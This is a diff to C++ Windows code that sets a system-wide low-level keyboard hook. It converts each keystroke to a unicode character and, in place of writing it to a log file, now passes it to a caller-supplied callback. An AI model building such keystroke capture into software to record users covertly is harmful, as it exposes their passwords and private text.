@@ -3,9 +3,9 @@
 
 using namespace std;
 
-std::function<void(int)> Hook::callback;
+std::function<void(wchar_t[])> Hook::callback;
 
-void Hook::SetHook(std::function<void(int)> keyboardCallback) {
+void Hook::SetHook(std::function<void(wchar_t[])> keyboardCallback) {
 	callback = keyboardCallback;
 	std::cout << "set hook";
 	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, NULL, 0);
@@ -31,9 +31,6 @@ LRESULT CALLBACK Hook::hookProc(const int nCode, const WPARAM wParam, const LPAR
 	switch (wParam) {
 	case WM_KEYDOWN:
 	{
-		std::cout << "keypressed";
-		callback(5);
-
 		/*
 		*  Converts the virtual key code and keystate to unicode character.
 		*  Virtual Key Codes: https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
@@ -54,14 +51,14 @@ LRESULT CALLBACK Hook::hookProc(const int nCode, const WPARAM wParam, const LPAR
 			* Was the enter key pressed? If so, insert a new line character
 			* into the log file.
 			*/
-			//logFile << L"\n" << std::flush;
+			callback(L"\n");
 		} else {
 			/*
 			* Log everything else to file. It's important to note that certain keys
 			* will produce odd characters (such as backspace). We could handle these
 			* but in this instance it's not required.
 			*/
-			//logFile << buffer << std::flush;
+			callback(buffer);
 		}
 	}
 
